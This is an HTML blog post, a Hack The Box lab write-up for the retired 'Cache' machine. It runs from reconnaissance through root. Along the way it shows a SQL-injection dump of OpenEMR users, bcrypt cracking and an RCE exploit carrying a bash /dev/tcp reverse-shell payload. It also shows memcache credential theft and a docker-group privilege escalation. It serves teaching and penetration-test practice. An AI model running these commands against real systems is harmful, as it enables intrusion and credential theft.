@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.75.1 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Pierre Vincent">
+<meta name="keywords" content="hackthebox, pentest, ctf, devops, sre, monitoring">
+<meta name="description" content="Since completing OSCP in November 2019, I have been refining my penetration testing skills on Hack The Box, a Penetration Testing lab. Every target is usually a rollercoaster of both frustration and excitement, definitely pushing the Try harder philosophy. Here is a step-by-step guide to root one of the recently retired machines: Cache.">
+
+
+<meta property="og:description" content="Since completing OSCP in November 2019, I have been refining my penetration testing skills on Hack The Box, a Penetration Testing lab. Every target is usually a rollercoaster of both frustration and excitement, definitely pushing the Try harder philosophy. Here is a step-by-step guide to root one of the recently retired machines: Cache.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack The Box write-up: Cache">
+<meta name="twitter:title" content="Hack The Box write-up: Cache">
+<meta property="og:url" content="https://blog.pvincent.io/2020/10/hack-the-box-write-up-cache/">
+<meta property="twitter:url" content="https://blog.pvincent.io/2020/10/hack-the-box-write-up-cache/">
+<meta property="og:site_name" content="Pierre Vincent">
+<meta property="og:description" content="Since completing OSCP in November 2019, I have been refining my penetration testing skills on Hack The Box, a Penetration Testing lab. Every target is usually a rollercoaster of both frustration and excitement, definitely pushing the Try harder philosophy. Here is a step-by-step guide to root one of the recently retired machines: Cache.">
+<meta name="twitter:description" content="Since completing OSCP in November 2019, I have been refining my penetration testing skills on Hack The Box, a Penetration Testing lab. Every target is usually a rollercoaster of both frustration and excitement, definitely pushing the Try harder philosophy. Here is a step-by-step guide to root one of the recently retired machines: Cache.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2020-10-10T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2020-10-10T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="security">
+    
+  
+  
+    
+      <meta property="article:tag" content="hackthebox">
+    
+      <meta property="article:tag" content="pentest">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+  <meta name="twitter:site" content="@PierreVincent">
+
+
+  <meta name="twitter:creator" content="@PierreVincent">
+
+
+
+
+
+
+  <meta property="og:image" content="https://blog.pvincent.io/images/htb-cache.png">
+  <meta property="twitter:image" content="https://blog.pvincent.io/images/htb-cache.png">
+
+
+
+
+
+  <meta property="og:image" content="https://s.gravatar.com/avatar/44d398d6974d29619c2dfc37428fc5ab?s=250">
+  <meta property="twitter:image" content="https://s.gravatar.com/avatar/44d398d6974d29619c2dfc37428fc5ab?s=250">
+
+
+    <title>Hack The Box write-up: Cache</title>
+
+    <link rel="icon" href="https://blog.pvincent.io/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://blog.pvincent.io/2020/10/hack-the-box-write-up-cache/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://blog.pvincent.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+      
+        <link rel="stylesheet" href="https://blog.pvincent.io/css/style.css">
+      
+    
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-104104349-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://blog.pvincent.io/">Pierre Vincent</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://blog.pvincent.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://s.gravatar.com/avatar/44d398d6974d29619c2dfc37428fc5ab?s=250" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://blog.pvincent.io/#about">
+          <img class="sidebar-profile-picture" src="https://s.gravatar.com/avatar/44d398d6974d29619c2dfc37428fc5ab?s=250" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Pierre Vincent</h4>
+        
+          <h5 class="sidebar-profile-bio">DevOps, InfoSec, SRE &amp; Continuous Delivery. OSCP</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://blog.pvincent.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://blog.pvincent.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://blog.pvincent.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://blog.pvincent.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://blog.pvincent.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/PierreVincent" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/PierreVincent" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.linkedin.com/in/pierrevincent85/" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-linkedin"></i>
+      
+      <span class="sidebar-button-desc">LinkedIn</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.slideshare.net/PierreVincent3/presentations" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-slideshare"></i>
+      
+      <span class="sidebar-button-desc">SlideShare</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://blog.pvincent.io/page/contributions">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-paragraph"></i>
+      
+      <span class="sidebar-button-desc">Contributions</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://blog.pvincent.io/page/speaking">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bullhorn"></i>
+      
+      <span class="sidebar-button-desc">Speaking</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://blog.pvincent.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title" itemprop="headline">
+      Hack The Box write-up: Cache
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2020-10-10T00:00:00Z">
+        
+  October 10, 2020
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://blog.pvincent.io/categories/security">security</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>Since completing OSCP in November 2019, I have been refining my penetration testing skills on <a href="https://www.hackthebox.eu/">Hack The Box</a>, a Penetration Testing lab. Every target is usually a rollercoaster of both frustration and excitement, definitely pushing the <em>Try harder</em> philosophy. Here is a step-by-step guide to root one of the recently retired machines: Cache.</p>
+<blockquote>
+<h4 id="disclaimer">Disclaimer</h4>
+<p><a href="https://www.hackthebox.eu/">Hack The Box</a> is an isolated Penetration Test lab, used for educational purposes in Cyber Security. The techniques used on these simulated targets should only be applied to applications and systems for which you have been given explicit permission and scope to test.</p>
+<p>Read more in Hack The Box <a href="https://www.hackthebox.eu/aup">Acceptable Use Policy</a></p>
+</blockquote>
+<p><img src="https://blog.pvincent.io/images/htb-cache-large.jpeg" alt="Cache"></p>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<p>In addition to only the IP address, <em>Hack The Box</em> machines sometimes have hostname specific functionality, meaning that something might not immediately be obvious if only using the IP address. As a result, a good first step to avoid wasting time is to add an entry in the <code>/etc/hosts</code> file to have this hostname setup from your attacking machine:</p>
+<pre><code>10.10.10.188 cache.htb
+</code></pre><p>A quick scan with <code>nmap</code> indicates the machine is running Ubuntu, can be accessed to SSH and is running an Apache webserver.</p>
+<pre><code># nmap -sS -sV -T4 cache.htb      
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 09:58 EDT
+Nmap scan report for cache.htb (10.10.10.188)
+Host is up (0.053s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>A further scan of the full range of TCP ports doesn&rsquo;t indicate anything else running, so our main chance of gaining entry is likely via whatever is running on the web server.</p>
+<p>Navigating to <a href="http://cache.htb/">http://cache.htb/</a> displays a (delightfully designed) website, teaching us about the basic definitions of hacking and cybercrime. A few other interesting things besides the main content of the website:</p>
+<ul>
+<li>Information about the author (Ash), a security researcher, also author of another project called HMS.</li>
+<li>A login form</li>
+</ul>
+<h1 id="foothold">Foothold</h1>
+<h2 id="whats-in-this-login-form">What&rsquo;s in this login form</h2>
+<p>The source of the login form page is loading a custom Javascript file <a href="http://cache.htb/jquery/functionality.js">http://cache.htb/jquery/functionality.js</a>. Inspecting this file gives away the username (<code>ash</code>) and password (<code>H@v3_fun</code>) to login:</p>
+<pre><code>[...]
+    function checkCorrectPassword(){
+        var Password = $(&quot;#password&quot;).val();
+        if(Password != 'H@v3_fun'){
+            alert(&quot;Password didn't Match&quot;);
+            error_correctPassword = true;
+        }
+    }
+    function checkCorrectUsername(){
+        var Username = $(&quot;#username&quot;).val();
+        if(Username != &quot;ash&quot;){
+            alert(&quot;Username didn't Match&quot;);
+            error_username = true;
+        }
+    }
+ [...]
+</code></pre><p>Login in with these credentials doesn&rsquo;t give us much however, as the page behind it is under construction. Let&rsquo;s keep these credentials handy, they might be useful later.</p>
+<h2 id="the-hms-project">The HMS Project</h2>
+<p>The author&rsquo;s page mentions a similar project as Cache, called HMS. If this project is running on the same machine, it might be possible to access it via a different hostname.</p>
+<p>Let&rsquo;s add another entry in <code>/etc/hosts</code>:</p>
+<pre><code>10.10.10.188 hms.htb
+</code></pre><p>Navigating to <a href="http://hms.htb">http://hms.htb</a> works, and we&rsquo;re greeted with the login form for OpenEMR, an open-source medical management application. The copyright indicates that this is running a relatively old version, from 2018.</p>
+<p>Searching for vulnerabilities of OpenEMR from 2018 yields a number of results, the most interesting being SQL Injection vulnerabilities like <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17179">CVE-2018-17179</a>. The following YouTube video from Cody Zacharias, <a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc">OpenEMR Simulated Attack</a> demonstrates how to exploit this vulnerability using sqlmap, ultimately allowing us to dump the users from the OpenEMR database:</p>
+<pre><code>Table: users_secure
+[1 entry]
++----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+
+| id | salt                           | password                                                     | username      | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
++----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+
+| 1  | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | openemr_admin | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
++----+--------------------------------+---------
+</code></pre><p><em>Note: As OpenEMR is open source, it&rsquo;s worth check out the <a href="https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617">patch</a> for this SQL Injection vulnerability - showing that the <code>patient_id</code> parameter was not properly escaped when building SQL queries.</em></p>
+<p>This password is hashed, but let&rsquo;s see if we can crack it with JohnTheRipper:</p>
+<pre><code># john emr_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 32 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+xxxxxx           (?)
+1g 0:00:00:00 DONE (2020-10-05 10:46) 6.250g/s 5400p/s 5400c/s 5400C/s tristan..felipe
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>The password for the user <code>openemr_admin</code> appears to be <code>xxxxxx</code>.</p>
+<p>Once authenticated in OpenEMR, we can leverage another <a href="https://www.exploit-db.com/exploits/45161">vulnerability</a>, this time to get Remote Code Execution (RCE).</p>
+<p>The exploit in the above link can be used to send a reverse shell to a previous open netcat listener on the attacking machine (here <code>10.10.14.115</code>):</p>
+<pre><code># python emr-rce.py http://hms.htb -u openemr_admin -p xxxxxx -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.115/4444 0&gt;&amp;1'
+ .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
+/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
+| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
+| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
+\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
+ )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
+(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
+                                                       
+   ={   P R O J E C T    I N S E C U R I T Y   }=    
+                                                       
+         Twitter : @Insecurity                       
+         Site    : insecurity.sh                     
+
+[$] Authenticating with openemr_admin:xxxxxx
+[$] Injecting payload
+
+</code></pre><p>The previous open netcat listener receives the shell straight away:</p>
+<pre><code># nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.115] from (UNKNOWN) [10.10.10.188] 48004
+bash: cannot set terminal process group (1683): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@cache:/var/www/hms.htb/public_html/interface/main$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><p>We now have a foothold in the machine, as the low-privilege user <code>www-data</code>.</p>
+<h1 id="privilege-escalation-to-user-1">Privilege escalation to User 1</h1>
+<p>Before any thorough enumeration of the machine, let&rsquo;s check the users that might be of interest to escalate privileges to.</p>
+<pre><code>www-data@cache:/var/www/hms.htb/public_html/interface/main$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+ash:x:1000:1000:ash:/home/ash:/bin/bash
+luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
+mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre><p>This tells us a few things:</p>
+<ul>
+<li>There are 2 real users, <code>ash</code> and <code>luffy</code></li>
+<li>The machine is running <code>memcache</code>, which isn&rsquo;t something typically installed by default.</li>
+</ul>
+<p>As <code>ash</code> was the user of the initial webapp, let&rsquo;s try these credentials we got earlier. First we must switch to an interactive shell (using python pty.spawn) and then switch to the user:</p>
+<pre><code>/var/www/hms.htb/public_html/interface/main$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;);'
+python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;);'        
+www-data@cache:/var/www/hms.htb/public_html/interface/main$ su ash
+su ash
+Password: H@v3_fun
+ash@cache:/var/www/hms.htb/public_html/interface/main$ id
+id
+uid=1000(ash) gid=1000(ash) groups=1000(ash)
+</code></pre><p>And we can find the user flag is available under /home/ash/user.txt:</p>
+<pre><code>ash@cache:~$ ls -l
+ls -l
+total 24
+drwxrwxr-x 2 root root 4096 May  5 11:17 Desktop
+drwxrwxr-x 2 root root 4096 Oct  9  2019 Documents
+drwxrwxr-x 2 root root 4096 Sep 18  2019 Downloads
+drwxrwxr-x 2 root root 4096 Sep 18  2019 Pictures
+drwxrwxr-x 2 root root 4096 Oct  9  2019 Public
+-r-x------ 1 ash  ash    33 Oct  5 09:13 user.txt
+</code></pre><p>Valuable lesson here&hellip; do not reuse passwords!</p>
+<h1 id="privilege-escalation-to-user-2">Privilege escalation to User 2</h1>
+<p>The other unusual thing we noticed earlier was that memcache is running on this machine. We didn&rsquo;t see any other ports than 22 or 80 open earlier, so it&rsquo;s likely only accessible from inside the machine. Memcache runs on port 11211 by default, by we can check the open ports to be safe:</p>
+<pre><code>$ netstat -tulpn | grep LISTEN
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      - 
+</code></pre><p>Confirming that memcache is running on port 11211 locally, we can connect to it with netcat to read the content of the cache. Luckily for us, this contains a username and password:</p>
+<pre><code>$ nc -nv 127.0.0.1 11211
+&lt;/public_html/interface/main$ nc -nv 127.0.0.1 11211        
+Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
+stats cachedump 1 0
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+END
+get user
+VALUE user 0 5
+luffy
+END
+get password
+END
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+</code></pre><p>These credentials (<code>luffy</code> // <code>0n3_p1ec3</code>) can be used to SSH directly to the box:</p>
+<pre><code>sh luffy@cache.htb
+luffy@cache.htb's password: 
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-109-generic x86_64)
+[...]
+luffy@cache:~$ id
+uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
+</code></pre><p>Another valuable lesson: do not store credentials in clear in databases or caches.</p>
+<h1 id="privilege-escalation-to-root">Privilege escalation to Root</h1>
+<p>The <code>luffy</code> user appears to be a group of the <code>docker</code> group, meaning it is allowed to start docker containers. If docker is running as <code>root</code>, it can be an easy way to escalate privileges&hellip; and looks like we&rsquo;re in luck:</p>
+<pre><code>luffy@cache:~$ ps aux | grep docker
+root       897  0.1  1.7 938520 70776 ?        Ssl  09:13   0:29 /usr/bin/dockerd -H fd://
+root      1240  0.1  1.0 885192 42304 ?        Ssl  09:13   0:43 containerd --config /var/run/docker/containerd/containerd.toml --log-level info
+luffy    25533  0.0  0.0  13136  1004 pts/1    S+   15:25   0:00 grep --color=auto docker
+</code></pre><p>Final step now is to run a Docker container, mount <code>/</code> inside it and use <code>chroot</code> to change the root directory to it:</p>
+<pre><code>docker run -v /:/data -ti --entrypoint=&quot;/bin/sh&quot; ubuntu
+# chroot /data
+# id
+uid=0(root) gid=0(root) groups=0(root)
+ls -l /root
+total 4
+-rw------- 1 root root 33 Oct  5 09:13 root.txt
+</code></pre><h1 id="conclusion">Conclusion</h1>
+<p>Cache was a pretty fun box, combining a few different techniques at every step of the way. A few of these vulnerabilities are unfortunately very typical of real-life systems: outdated software missing security patches, reused passwords, weak passwords (hashed, but easily crackable), passwords stored in clear text&hellip; As you can see, this all makes things easy for an attacker to gain access and escalate privileges, so remember to keep these in mind when you are building systems and applications!</p>
+<hr>
+<h4 id="_looking-for-a-penetration-test_"><em>Looking for a Penetration Test?</em></h4>
+<p><em>I am certified as an Offensive Security Certified Professional (OSCP). Don&rsquo;t hesitate to get in touch with me (<a href="mailto:speaking@pvincent.io">speaking@pvincent.io</a>) for more info about getting a vulnerability assessment or deep-dive penetration test.</em></p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://blog.pvincent.io/tags/hackthebox/">hackthebox</a>
+
+  <a class="tag tag--primary tag--small" href="https://blog.pvincent.io/tags/pentest/">pentest</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://blog.pvincent.io/2019/05/prometheus-workshops-follow-up-frequently-asked-questions/" data-tooltip="Prometheus workshops follow-up: frequently asked questions">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2020 Pierre Vincent. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://blog.pvincent.io/2019/05/prometheus-workshops-follow-up-frequently-asked-questions/" data-tooltip="Prometheus workshops follow-up: frequently asked questions">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://s.gravatar.com/avatar/44d398d6974d29619c2dfc37428fc5ab?s=250" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Pierre Vincent</h4>
+    
+      <div id="about-card-bio">DevOps, InfoSec, SRE &amp; Continuous Delivery. OSCP</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Head of SRE
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Glofox - Ireland
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      
+      <div id="cover" style="background-image:url('https://blog.pvincent.io/images/cover.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://blog.pvincent.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+
+  
+    
+  
+
+
+
+
